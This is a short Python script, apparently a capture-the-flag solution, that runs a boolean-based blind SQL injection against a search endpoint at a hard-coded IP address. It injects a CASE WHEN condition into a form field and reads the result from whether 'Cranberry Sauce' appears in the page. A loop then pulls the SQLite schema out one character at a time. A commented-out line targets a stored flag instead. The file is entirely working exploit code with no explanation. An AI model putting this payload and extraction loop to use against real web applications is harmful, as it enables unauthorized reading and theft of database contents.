import requests
import string

url = 'http://34.135.223.176:1928/search'


def query(cond: str) -> bool:
    r = requests.post(url, data={"query": f"""z' or (SELECT CASE WHEN ({cond}) THEN "1" ELSE "0" END)="1" --"""})
    r.raise_for_status()
    return 'Cranberry Sauce' in r.text


alphabet = ' .,{}_' + string.ascii_uppercase + string.ascii_lowercase + string.digits
curr_str = []

for i in range(500):
    print(i)
    for ch in alphabet:
        condition = f'SUBSTR((SELECT sql FROM sqlite_schema), {i+1}, 1) = "{ch}"'             # database structure
        #condition = f'SUBSTR((select flag from recipes where id = 8), {i+1}, 1)= "{ch}"'  # flag
        if query(condition):
            curr_str.append(ch)
            break

    print("".join(curr_str))
